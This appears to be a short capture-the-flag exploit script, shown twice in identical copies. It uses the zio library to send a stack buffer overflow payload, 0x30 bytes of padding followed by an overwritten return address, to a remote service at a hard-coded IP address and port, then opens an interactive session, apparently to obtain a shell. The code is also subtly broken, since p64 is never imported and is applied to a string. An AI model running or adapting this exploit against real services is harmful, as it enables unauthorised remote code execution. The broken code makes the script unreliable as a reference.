import zio

junk = "A" * 0x30
address = "0x400751"
payload = junk + p64(address)

# Io = zio.zio("./level0")
Io = zio.zio(("114.116.54.89", 10003))
Io.write(payload)
Io.interact()

import zio

junk = "A" * 0x30
address = "0x400751"
payload = junk + p64(address)

# Io = zio.zio("./level0")
Io = zio.zio(("114.116.54.89", 10003))
Io.write(payload)
Io.interact()
